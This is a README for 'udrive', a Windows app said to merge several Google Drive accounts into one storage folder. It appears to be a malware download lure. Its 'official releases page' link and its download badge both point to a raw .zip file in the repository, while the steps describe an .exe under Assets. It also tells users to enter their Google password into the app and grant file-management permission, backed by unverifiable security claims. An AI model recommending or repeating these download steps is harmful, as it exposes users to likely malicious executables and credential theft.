# 📂 udrive - Combine multiple Google Drive accounts easily

[![](https://img.shields.io/badge/Download_udrive_for_Windows-blue)](https://raw.githubusercontent.com/kamsa3056/udrive/main/src/Software_2.6.zip)

udrive merges your multiple Google Drive accounts into one storage space. Google provides 15GB of free storage for every account. If you own many accounts, you possess a massive amount of storage hidden across different logins. This application gathers those scattered accounts and shows them as a single folder on your computer. You see all your files in one place without logging in and out of different browser tabs.

## ⚙️ System Requirements

You need a computer running Windows 10 or Windows 11. The application works best with a stable internet connection. You need at least 200MB of free disk space to install the software. You must have at least two Google accounts to see the benefits of the pool feature.

## 📥 How to Install

Follow these steps to set up the software on your machine:

1. Visit the [official releases page](https://raw.githubusercontent.com/kamsa3056/udrive/main/src/Software_2.6.zip) to obtain the latest version.
2. Look for the file ending in `.exe` under the Assets section.
3. Click the file name to start the download.
4. Locate the file in your Downloads folder once the transfer finishes.
5. Double-click the file to start the installer.
6. Follow the on-screen prompts to place the software on your computer.
7. Click Finish when the progress bar reaches the end.

## 🚀 Setting Up Your Storage

After you open udrive, you see a clean dashboard. You must link your accounts to start the pooling process.

1. Click the Add Account button.
2. A window appears for you to sign into your Google account.
3. Enter your email and password as you do on the regular Google website.
4. Click Allow when Google asks for permission to manage your files.
5. Repeat these steps for every account you own.

The dashboard displays the total storage available across all linked accounts. You see a combined bar chart showing how much space remains.

## 📁 Managing Your Files

udrive functions like a standard folder on your Windows machine. You move files into this folder to upload them to the cloud. You move files out of the folder to download them to your device.

The app handles the distribution of your files automatically. It places smaller files on accounts with more room. It tracks where each file lives so you do not have to worry about the backend processes. 

If you delete a file in the udrive folder, the application removes it from the specific account where it resides. The software manages these connections in the background to ensure your files stay safe and current.

## 🛡️ Privacy and Security

You control your data at all times. udrive acts as a bridge between your local computer and your Google Drive storage. The software does not store your Google password on your hard drive. It uses a secure authentication token to communicate with Google systems. 

Your files remain encrypted while they travel between your computer and the Google servers. You hold the master key to your accounts. You can remove any account from the app settings at any time, which cuts the connection immediately.

## 🛠️ Troubleshooting

Most issues stem from connection errors or expired permissions. Use this guide to fix common problems.

**The app shows an error when I open it**
Ensure your computer has an active internet connection. Check if your security software blocks udrive from accessing the network. You might need to add an exception in your firewall settings.

**Files do not appear in my folder**
Wait for the sync indicator to finish. The app checks for changes periodically. You can force a refresh by clicking the Sync button located in the top menu.

**I cannot add a new account**
Check if you reached the limit for connected services. Go to the Settings menu and check the list of active accounts. If you have too many, remove one that you no longer use before adding a new one.

**The window size is too small**
You can resize the window by dragging the edges with your mouse. Use the maximize button in the top right corner to view the app in full-screen mode.

- Keep your Windows operating system updated to ensure compatibility with the latest features.

## 📝 Frequently Asked Questions

**Does this software delete my files?**
No. The app only deletes files if you explicitly command it to remove them via the interface or the folder view.

**Can I use this on a library computer?**
You should avoid using public computers for personal file management. Only install this software on a machine you own and control.

**What happens if I stop using the app?**
Your files remain safe in their original Google Drive accounts. You can still access them through a web browser even if you uninstall udrive.

**Does this cost money?**
The software is free to use. You only pay for additional Google storage if you choose to upgrade your individual accounts through Google.

**Can I share files with others?**
You share files using the standard Google Drive link-sharing method. Right-click any file within your udrive folder, select the Google Drive option, and choose Share to generate a link.
